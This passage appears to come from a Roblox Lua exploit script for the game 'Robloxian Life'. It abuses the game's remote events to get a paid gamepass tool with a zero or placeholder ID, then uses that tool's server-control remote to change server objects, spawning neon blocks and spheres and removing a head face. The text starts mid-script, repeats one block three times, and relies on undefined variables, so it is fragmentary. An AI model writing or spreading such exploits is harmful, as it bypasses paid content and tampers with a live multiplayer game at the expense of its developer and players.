game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()

			   

			


		end
		
	end
end
end)


function GetPlayer(String)
    local plr
    local strl = String:lower()
        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name:lower():sub(1, #String) == String:lower() then
                plr = v
            end 
        end
        if String == "me" then
                plr = game.Players.LocalPlayer
            end
        if String == "" or String == " " then
           plr = nil
        end
    return plr
end


if string.sub(l.Text, 1, 6) == "rhead" then
    game.workspace.GiveTool:FireServer(2187476, "PompousTheCloud") -- YOUR GAMEPASS

local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}

local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["face"]:Remove())
end

if cmd =="exert" then
    --Made by 6x2bAlone
--The Greates Scripter for Robloxian Life
local UserName  = game:GetService('Players').LocalPlayer.Name
local mesh = 1107038050
local texture = 5821992842
local CE = {}
local Variables = {
    workspace = game:GetService("Workspace"),
    players = game:GetService("Players")
}

local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

function CE:FireEvent(ItemName, Object, Property, Value)
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end


game.Workspace.GiveTool:FireServer(gamepass_id, "PompousTheCloud")
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW

game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer("1374269")
MainUserW:WaitForChild("KittyEars")
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"]["Mesh"],"MeshId","rbxassetid://12829955991")
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"]["Mesh"],"TextureId","rbxassetid://12829915545")
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"]["Mesh"],"Scale",Vector3.new(6.0, 6.0, 6.0))
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Rotation",Vector3.new(0, 15, 0))
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Transparency","0.0")
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Anchored",true)
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Position",Vector3.new(-25, 3981,393.5))
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"CanCollide",false)
wait(.1)
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Size",Vector3.new(2.8, 2.8, 2.8))
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Material","Neon")
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Shape","Ball")
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Transparency","0")
MainUserW.KittyEars:Remove()
end
